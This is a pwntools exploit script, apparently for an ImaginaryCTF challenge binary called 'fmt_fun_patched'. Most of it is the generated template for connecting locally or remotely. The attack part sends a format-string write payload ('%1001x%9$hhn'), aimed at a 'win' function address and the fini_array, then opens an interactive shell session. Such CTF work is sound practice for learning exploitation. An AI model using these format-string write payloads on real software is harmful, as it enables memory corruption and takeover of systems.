#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host fun.chal.imaginaryctf.org --port 1337 fmt_fun_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fmt_fun_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'fun.chal.imaginaryctf.org'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00401234
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

fini_array = 0x403db8

def exec_fmt(payload):
    p = process("./fmt_fun_patched")
    p.sendline(payload)
    return p.recvall()

#autofmt = FmtStr(exec_fmt)
#offset = autofmt.offset
#print(offset)
win = 0x00401251

#payload = fmtstr_payload(5, {0x403db8:win})
#io.sendline(payload)
#io.sendline(b'A'*400)

io.sendline(b'%1001x' + b'%9$hhn')

io.interactive()

